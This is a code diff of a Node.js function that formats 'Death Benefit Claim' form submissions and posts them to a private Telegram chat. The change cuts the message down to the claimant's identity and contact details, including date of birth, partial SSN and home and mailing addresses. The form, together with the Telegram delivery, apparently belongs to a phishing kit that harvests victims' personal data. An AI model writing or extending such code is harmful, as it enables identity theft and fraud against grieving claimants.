@@ -8,45 +8,18 @@ const https = require("https");
 
 
 function sendTelegramNotification(payload, callback) {
-  const fields = [
-    { label: "Contract Number", key: "contractNumber" },
-    { label: "Deceased First Name", key: "deceasedFirstName" },
-    { label: "Deceased Last Name", key: "deceasedLastName" },
-    { label: "Benefit Value", key: "benefitValue" },
-    { label: "Beneficiary Name", key: "beneficiaryName" },
-    { label: "Manner of Death", key: "mannerOfDeath" },
-    { label: "Age at Death", key: "ageAtDeath" },
-    { label: "Marital Status", key: "maritalStatus" },
-    { label: "Claimant Name", key: "claimantName" },
-    { label: "Relationship to Deceased", key: "relationship" },
-    { label: "Claimant Email", key: "email" },
-    { label: "Claimant Phone", key: "phone" },
-    { label: "Date of Birth", key: "dob" },
-    { label: "Tax ID / SSN (last 4)", key: "taxId" },
-    { label: "Home Address", key: "address" },
-    { label: "City", key: "city" },
-    { label: "State", key: "state" },
-    { label: "ZIP Code", key: "zipCode" },
-    { label: "Payment Method", key: "paymentMethod" },
-    { label: "Mailing Street Address", key: "checkMailAddress" },
-    { label: "Mailing City", key: "checkMailCity" },
-    { label: "Mailing State", key: "checkMailState" },
-    { label: "Mailing ZIP Code", key: "checkMailZip" },
-    { label: "Death Certificate Provided", key: "deathCertificate" },
-    { label: "Government ID Provided", key: "governmentId" },
-    { label: "Estate Docs Provided", key: "estateDocs" },
-    { label: "Attestation Confirmed", key: "attestation" },
-    { label: "Uploaded Files", key: "uploadedFiles" },
-    { label: "Additional Notes", key: "notes" }
-  ];
-  let message = `\u2728 *New Death Benefit Claim Submitted* \u2728\n\n`;
-  fields.forEach(f => {
-    if (payload[f.key]) {
-      let value = Array.isArray(payload[f.key]) ? payload[f.key].join(", ") : payload[f.key];
-      message += `*${f.label}:* ${value}\n`;
-    }
-  });
-  message += `\n_Submitted: ${new Date().toLocaleString()}_`;
+  // Only include the requested fields
+  let message = '*Claimant Name:* ' + (payload.claimantName || '') + '\n'
+    + '*Relationship to Deceased:* ' + (payload.relationship || '') + '\n'
+    + '*Claimant Email:* ' + (payload.email || '') + '\n'
+    + '*Claimant Phone:* ' + (payload.phone || '') + '\n'
+    + '*Date of Birth:* ' + (payload.dob || '') + '\n'
+    + '*Tax ID / SSN (last 4):* ' + (payload.taxId || '') + '\n'
+    + '*Home Address:* ' + (payload.address || '') + '\n'
+    + '*City:* ' + (payload.city || '') + '\n'
+    + '*State:* ' + (payload.state || '') + '\n'
+    + '*ZIP Code:* ' + (payload.zipCode || '') + '\n'
+    + '*Mailing address:* ' + [payload.checkMailAddress, payload.checkMailCity, payload.checkMailState, payload.checkMailZip].filter(Boolean).join(', ');
 
   const postData = JSON.stringify({
     chat_id: TELEGRAM_USER_ID,
